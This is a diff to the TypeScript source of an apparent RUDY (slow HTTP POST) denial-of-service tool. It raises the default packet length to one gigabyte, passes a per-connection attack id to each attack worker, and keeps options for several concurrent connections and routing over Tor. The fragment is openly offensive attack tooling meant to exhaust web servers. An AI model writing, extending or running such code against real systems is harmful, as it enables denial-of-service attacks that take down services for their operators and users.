@@ -25,7 +25,7 @@ export interface IRudyConfig {
 const defaultConfig: IRudyConfig = {
     target: "http://localhost:80/",
     method: HTTPMethod.POST,
-    packet_len: 1000000,
+    packet_len: 1024 * 1024 * 1024,
     maxConnections: 5,
     delay: 2,
     shouldUseTor: false,
@@ -44,7 +44,9 @@ class RudyService implements IService {
     public attack() {
         logger.info({message: "Starting Attack at " + this.config.target, category: this.serviceName})
         for (var i = 0; i < this.config.maxConnections; i++) {
-            const attackService = new AttackService(this.config)
+            const attackService = new AttackService({target: this.config.target, method: this.config.method,
+                                                     packet_len: this.config.packet_len, delay: this.config.delay,
+                                                     shouldUseTor: this.config.shouldUseTor, attackId: i})
             attackService.attack()
             this.attacks.push(attackService)
         }
